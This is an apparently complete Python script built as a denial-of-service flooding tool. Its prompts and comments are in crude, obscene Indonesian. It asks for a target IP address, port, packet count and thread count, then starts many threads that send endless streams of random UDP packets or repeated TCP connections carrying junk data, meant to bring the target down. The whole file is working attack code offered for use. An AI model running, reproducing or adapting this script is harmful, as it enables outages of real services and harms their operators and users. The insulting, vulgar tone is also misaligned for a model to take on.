#!/usr/bin/env python3
#Mending Tobat Dah
#Bapak Kau Lah
#Lonte Kalian
import random
import socket
import threading
import os

os.system("clear")
print("YodZ ni Bwang")
print("Abuse Meki pacarlu Item")
print("Hmmm")
ip = str(input(" Ddos make ip kontol | Ip:"))
port = int(input(" Ddos make port kontol | Port:"))
choice = str(input(" Isi Kontol | Yakin Tod?(y/n):"))
times = int(input(" Ddos make Packets kontol | Packets:"))
threads = int(input(" Ddos make Threads kontpl | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Yodz |")
		except:
			print("[!] | Bilangin Kalo Ga Suka Bewan Ef ef |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Yodz itu noob")
		except:
			s.close()
			print("[*] Down Tuh Fix")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
